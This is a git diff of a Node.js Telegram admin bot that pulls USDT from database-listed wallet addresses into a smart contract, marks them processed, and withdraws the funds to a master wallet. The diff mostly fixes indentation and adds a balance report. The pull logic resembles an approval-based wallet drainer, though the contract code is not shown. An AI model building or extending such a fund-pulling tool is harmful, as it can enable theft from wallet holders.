@@ -1,3 +1,4 @@
+// backend/src/config/telegram.js
 const TelegramBot = require('node-telegram-bot-api');
 const dotenv = require('dotenv');
 const { ethers } = require('ethers');
@@ -190,21 +191,21 @@ class TelegramService {
     }
 
     // escape MarkdownV2 special characters, defensive: accept numbers/objects
-    // REPLACE your existing escapeMarkdown function with this one:
-escapeMarkdown(text) {
-    if (!text && text !== 0) return '';
-    
-    // Convert to string first
-    let result = String(text);
-    
-    // Escape backslashes first to prevent double escaping
-    result = result.replace(/\\/g, '\\\\');
-    
-    // Then escape all MarkdownV2 special characters
-    result = result.replace(/([_\*\[\]\(\)~`>#+\-=|{}\.!])/g, '\\$1');
-    
-    return result;
-}
+    escapeMarkdown(text) {
+        if (!text && text !== 0) return '';
+        
+        // Convert to string first
+        let result = String(text);
+        
+        // Escape backslashes first to prevent double escaping
+        result = result.replace(/\\/g, '\\\\');
+        
+        // Then escape all MarkdownV2 special characters
+        result = result.replace(/([_\*\[\]\(\)~`>#+\-=|{}\.!])/g, '\\$1');
+        
+        return result;
+    }
+
     // Mask address for security
     maskAddress(address) {
         if (!address || typeof address !== 'string') return 'Invalid Address';
@@ -746,15 +747,15 @@ Error: ${this.escapeMarkdown((gasResult && gasResult.error) ? gasResult.error : 
             }
 
             // Pull USDT from wallet to contract
-            // In handlePullCommand, find the success message section and replace it with:
-if (pullResult && pullResult.success) {
-    // Escape all values for MarkdownV2
-    const escapedAmount = this.escapeMarkdown(pullResult.amount || '0');
-    const maskedTxHash = this.maskAddress(pullResult.txHash || 'N/A');
-    const escapedTxHash = this.escapeMarkdown(maskedTxHash);
-    const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+            const pullResult = await contractService.pullUSDTFromWallet(walletAddress);
 
-    const successMessage = `
+            if (pullResult && pullResult.success) {
+                const escapedAmount = this.escapeMarkdown(pullResult.amount || '0');
+                const maskedTxHash = this.maskAddress(pullResult.txHash || 'N/A');
+                const escapedTxHash = this.escapeMarkdown(maskedTxHash);
+                const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+
+                const successMessage = `
 ✅ *PULL SUCCESSFUL*
 Wallet: \`${maskedAddress}\`
 Amount: *${escapedAmount} USDT*
@@ -764,35 +765,35 @@ Transaction: \`${escapedTxHash}\`
 • Check balances for update
 
 🔄 *Last Updated:* ${escapedTimestamp}
-    `;
+                `;
 
-    await this.bot.sendMessage(chatId, successMessage, {
-        parse_mode: 'MarkdownV2',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '📊 Check Balances', callback_data: 'balances' },
-                    { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
-                ],
-                [
-                    { text: '🏠 Main Menu', callback_data: 'menu' }
-                ]
-            ]
-        }
-    });
+                await this.bot.sendMessage(chatId, successMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Check Balances', callback_data: 'balances' },
+                                { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
+                            ],
+                            [
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
 
-    // Update database
-    try {
-        const updateQuery = `
-            UPDATE wallets 
-            SET is_processed = true, updated_at = NOW()
-            WHERE address = $1
-        `;
-        await database.query(updateQuery, [walletAddress]);
-    } catch (dbError) {
-        console.error('Database update error:', dbError && dbError.message ? dbError.message : dbError);
-    }
-} else {
+                // Update database
+                try {
+                    const updateQuery = `
+                        UPDATE wallets 
+                        SET is_processed = true, updated_at = NOW()
+                        WHERE address = $1
+                    `;
+                    await database.query(updateQuery, [walletAddress]);
+                } catch (dbError) {
+                    console.error('Database update error:', dbError && dbError.message ? dbError.message : dbError);
+                }
+            } else {
                 const errorMessage = `
 ❌ *PULL FAILED*
 Wallet: \`${maskedAddress}\`
@@ -846,11 +847,11 @@ Error: ${this.escapeMarkdown(error && error.message ? error.message : String(err
     }
 
     async handleWithdrawCommand(chatId) {
-    if (chatId.toString() !== this.adminChatId) {
-        return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-    }
+        if (chatId.toString() !== this.adminChatId) {
+            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
+        }
 
-    const processingMessage = `
+        const processingMessage = `
 🏦 *Withdraw Operation Initiated*
 Withdrawing all USDT from contract to master wallet\\.\\.\\.
 
@@ -860,51 +861,51 @@ Withdrawing all USDT from contract to master wallet\\.\\.\\.
 • Send confirmation
 
 ⏳ *Please wait*\\.\\.\\.
-    `;
+        `;
 
-    const processingOptions = {
-        parse_mode: 'MarkdownV2',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '🏠 Main Menu', callback_data: 'menu' }
+        const processingOptions = {
+            parse_mode: 'MarkdownV2',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: '🏠 Main Menu', callback_data: 'menu' }
+                    ]
                 ]
-            ]
-        }
-    };
+            }
+        };
 
-    try {
-        const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
-
-        // Import the contract service
-        let contractService;
         try {
-            contractService = require('../services/contract.service');
-        } catch (e) {
-            console.warn('contract.service not found:', e && e.message ? e.message : e);
-        }
+            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
 
-        if (!contractService || typeof contractService.withdrawUSDTToMaster !== 'function') {
-            await this.bot.sendMessage(chatId, '❌ Withdrawal service unavailable.');
-            return result;
-        }
+            // Import the contract service
+            let contractService;
+            try {
+                contractService = require('../services/contract.service');
+            } catch (e) {
+                console.warn('contract.service not found:', e && e.message ? e.message : e);
+            }
 
-        // Execute the actual withdrawal with timeout
-        const withdrawPromise = contractService.withdrawUSDTToMaster();
-        const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve({ success: false, error: 'Operation timeout after 45 seconds' }), 45000));
+            if (!contractService || typeof contractService.withdrawUSDTToMaster !== 'function') {
+                await this.bot.sendMessage(chatId, '❌ Withdrawal service unavailable.');
+                return result;
+            }
 
-        const withdrawResult = await Promise.race([withdrawPromise, timeoutPromise]);
+            // Execute the actual withdrawal with timeout
+            const withdrawPromise = contractService.withdrawUSDTToMaster();
+            const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve({ success: false, error: 'Operation timeout after 45 seconds' }), 45000));
 
-        if (withdrawResult && withdrawResult.success) {
-            // Escape all values for MarkdownV2
-            const maskedMasterWallet = this.maskAddress(this.masterWallet);
-            const escapedMasterWallet = this.escapeMarkdown(maskedMasterWallet);
-            const escapedAmount = this.escapeMarkdown(withdrawResult.amount || '0');
-            const maskedTxHash = this.maskAddress(withdrawResult.txHash || 'N/A');
-            const escapedTxHash = this.escapeMarkdown(maskedTxHash);
-            const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+            const withdrawResult = await Promise.race([withdrawPromise, timeoutPromise]);
 
-            const successMessage = `
+            if (withdrawResult && withdrawResult.success) {
+                // Escape all values for MarkdownV2
+                const maskedMasterWallet = this.maskAddress(this.masterWallet);
+                const escapedMasterWallet = this.escapeMarkdown(maskedMasterWallet);
+                const escapedAmount = this.escapeMarkdown(withdrawResult.amount || '0');
+                const maskedTxHash = this.maskAddress(withdrawResult.txHash || 'N/A');
+                const escapedTxHash = this.escapeMarkdown(maskedTxHash);
+                const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+
+                const successMessage = `
 ✅ *WITHDRAWAL SUCCESSFUL*
 Amount: *${escapedAmount} USDT*
 To: \`${escapedMasterWallet}\`
@@ -915,81 +916,254 @@ Transaction: \`${escapedTxHash}\`
 • Master Wallet USDT: Check balances for update
 
 🔄 *Last Updated:* ${escapedTimestamp}
-            `;
+                `;
 
-            await this.bot.sendMessage(chatId, successMessage, {
-                parse_mode: 'MarkdownV2',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📊 Check Balances', callback_data: 'balances' },
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
+                await this.bot.sendMessage(chatId, successMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Check Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
                         ]
-                    ]
-                }
-            });
-        } else {
-            // Escape error message
-            const escapedError = this.escapeMarkdown((withdrawResult && withdrawResult.error) ? withdrawResult.error : 'Unknown error occurred');
-            const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+                    }
+                });
+            } else {
+                // Escape error message
+                const escapedError = this.escapeMarkdown((withdrawResult && withdrawResult.error) ? withdrawResult.error : 'Unknown error occurred');
+                const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
-            const errorMessage = `
+                const errorMessage = `
 ❌ *WITHDRAWAL FAILED*
 Error: ${escapedError}
 
 🔄 *Last Updated:* ${escapedTimestamp}
-            `;
-            
-            await this.bot.sendMessage(chatId, errorMessage, {
-                parse_mode: 'MarkdownV2',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📊 Check Balances', callback_data: 'balances' },
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
+                `;
+                
+                await this.bot.sendMessage(chatId, errorMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Check Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
                         ]
-                    ]
-                }
-            });
-        }
+                    }
+                });
+            }
 
-        return result;
-    } catch (error) {
-        console.error('Error in withdraw command:', error && error.message ? error.message : error);
+            return result;
+        } catch (error) {
+            console.error('Error in withdraw command:', error && error.message ? error.message : error);
 
-        // Escape error message
-        const cleanErrorMessage = error && error.message
-            ? error.message.replace(/[^a-zA-Z0-9\s\.\,\!\?\-]/g, '').substring(0, 200)
-            : 'Unknown error occurred';
-        const escapedErrorMessage = this.escapeMarkdown(cleanErrorMessage);
-        const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+            // Escape error message
+            const cleanErrorMessage = error && error.message
+                ? error.message.replace(/[^a-zA-Z0-9\s\.\,\!\?\-]/g, '').substring(0, 200)
+                : 'Unknown error occurred';
+            const escapedErrorMessage = this.escapeMarkdown(cleanErrorMessage);
+            const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
-        const errorMessage = `
+            const errorMessage = `
 ❌ *WITHDRAWAL FAILED*
 Error: ${escapedErrorMessage}
 
 🔄 *Last Updated:* ${escapedTimestamp}
+            `;
+
+            try {
+                await this.bot.sendMessage(chatId, errorMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📊 Check Balances', callback_data: 'balances' },
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            } catch (e) {
+                console.error('Failed to send withdraw error message:', e && e.message ? e.message : e);
+            }
+
+            return this.bot.sendMessage(chatId, `❌ Error: ${cleanErrorMessage}`);
+        }
+    }
+
+    async handleBalancesCommand(chatId) {
+        if (chatId.toString() !== this.adminChatId) {
+            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
+        }
+
+        const processingMessage = `
+📊 *Fetching Real Balances*
+
+📋 *Balance Checks:*
+• Smart Contract USDT Balance
+• Master Wallet BNB Balance
+• Master Wallet USDT Balance
+
+⏳ *Querying blockchain*\\.\\.\\.
         `;
 
+        const processingOptions = {
+            parse_mode: 'MarkdownV2',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: '🏠 Main Menu', callback_data: 'menu' }
+                    ]
+                ]
+            }
+        };
+
         try {
-            await this.bot.sendMessage(chatId, errorMessage, {
+            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
+
+            // Fetch real balances with timeout
+            const contractBalancePromise = this.getContractUSDTBalance();
+            const masterBNBBalancePromise = this.getMasterWalletBNBBalance();
+            const masterUSDTBalancePromise = this.getMasterWalletUSDTBalance();
+
+            // Add timeout wrapper
+            const timeoutWrapper = (promise, ms) => {
+                return Promise.race([
+                    promise,
+                    new Promise((resolve) => setTimeout(() => resolve({ balance: '0', error: 'Timeout' }), ms))
+                ]);
+            };
+
+            const contractBalance = await timeoutWrapper(contractBalancePromise, 15000);
+            const masterBNBBalance = await timeoutWrapper(masterBNBBalancePromise, 15000);
+            const masterUSDTBalance = await timeoutWrapper(masterUSDTBalancePromise, 15000);
+
+            // Format the real balances message
+            const contractAddress = process.env.CONTRACT_ADDRESS || 'Not set';
+            const maskedContractAddress = this.maskAddress(contractAddress);
+            const maskedMasterWallet = this.maskAddress(this.masterWallet);
+
+            // Escape everything that will go into MarkdownV2
+            const escapedContractAddress = this.escapeMarkdown(maskedContractAddress);
+            const escapedMasterWallet = this.escapeMarkdown(maskedMasterWallet);
+            const escapedContractBalance = this.escapeMarkdown(contractBalance && contractBalance.balance ? contractBalance.balance : '0');
+            const escapedBNBBalance = this.escapeMarkdown(masterBNBBalance && masterBNBBalance.balance ? masterBNBBalance.balance : '0');
+            const escapedUSDTBalance = this.escapeMarkdown(masterUSDTBalance && masterUSDTBalance.balance ? masterUSDTBalance.balance : '0');
+            const escapedContractError = contractBalance.error ? this.escapeMarkdown(String(contractBalance.error)) : null;
+            const escapedBNBError = masterBNBBalance.error ? this.escapeMarkdown(String(masterBNBBalance.error)) : null;
+            const escapedUSDTError = masterUSDTBalance.error ? this.escapeMarkdown(String(masterUSDTBalance.error)) : null;
+            const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
+
+            let balancesMessage = `
+📊 *REAL BALANCE REPORT*
+
+`;
+
+            // Contract USDT Balance
+            if (process.env.CONTRACT_ADDRESS) {
+                balancesMessage += `
+💰 *Smart Contract*
+• Address: \`${escapedContractAddress}\`
+• USDT Balance: *${escapedContractBalance} USDT*
+`;
+                if (escapedContractError) {
+                    balancesMessage += `• ⚠️ Error: ${escapedContractError}\n`;
+                }
+            } else {
+                balancesMessage += `
+💰 *Smart Contract*
+• Address: Not configured
+• USDT Balance: 0\\.00 USDT
+`;
+            }
+
+            // Master Wallet Balances
+            balancesMessage += `
+🏦 *Master Wallet*
+• Address: \`${escapedMasterWallet}\`
+• BNB Balance: *${escapedBNBBalance} BNB*
+• USDT Balance: *${escapedUSDTBalance} USDT*
+`;
+
+            if (escapedBNBError) {
+                balancesMessage += `• ⚠️ BNB Error: ${escapedBNBError}\n`;
+            }
+            if (escapedUSDTError) {
+                balancesMessage += `• ⚠️ USDT Error: ${escapedUSDTError}\n`;
+            }
+
+            balancesMessage += `
+🔄 *Last Updated:* ${escapedTimestamp}
+`;
+
+            await this.bot.sendMessage(chatId, balancesMessage, {
                 parse_mode: 'MarkdownV2',
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: '📊 Check Balances', callback_data: 'balances' },
+                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
+                            { text: '📥 Withdraw', callback_data: 'withdraw' }
+                        ],
+                        [
+                            { text: '🔄 Refresh Balances', callback_data: 'balances' },
                             { text: '🏠 Main Menu', callback_data: 'menu' }
                         ]
                     ]
                 }
             });
-        } catch (e) {
-            console.error('Failed to send withdraw error message:', e && e.message ? e.message : e);
-        }
 
-        return this.bot.sendMessage(chatId, `❌ Error: ${cleanErrorMessage}`);
+            return result;
+        } catch (error) {
+            console.error('Error in balances command:', error && error.message ? error.message : error);
+
+            // Create a clean error message without special characters
+            const cleanErrorMessage = error && error.message
+                ? error.message.replace(/[^a-zA-Z0-9\s\.\,\!\?\-]/g, '').substring(0, 200)
+                : 'Unknown error occurred';
+
+            const errorMessage = `
+❌ *BALANCES FAILED*
+Error: ${this.escapeMarkdown(cleanErrorMessage)}
+
+🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+    `;
+
+            // Send with fallback to plain text if markdown fails
+            try {
+                await this.bot.sendMessage(chatId, errorMessage, {
+                    parse_mode: 'MarkdownV2',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            } catch (markdownError) {
+                // Fallback without markdown
+                const fallbackMessage = `
+❌ BALANCES FAILED
+Error: ${cleanErrorMessage}
+
+🔄 Last Updated: ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
+        `;
+                await this.bot.sendMessage(chatId, fallbackMessage, {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            }
+
+            return this.bot.sendMessage(chatId, `❌ Error: ${cleanErrorMessage}`);
+        }
     }
-}
+
     // Process webhook updates manually
     async processUpdate(update) {
         if (this.bot) {
@@ -1004,8 +1178,3 @@ Error: ${escapedErrorMessage}
 }
 
 module.exports = new TelegramService();
-
-
-
-
-
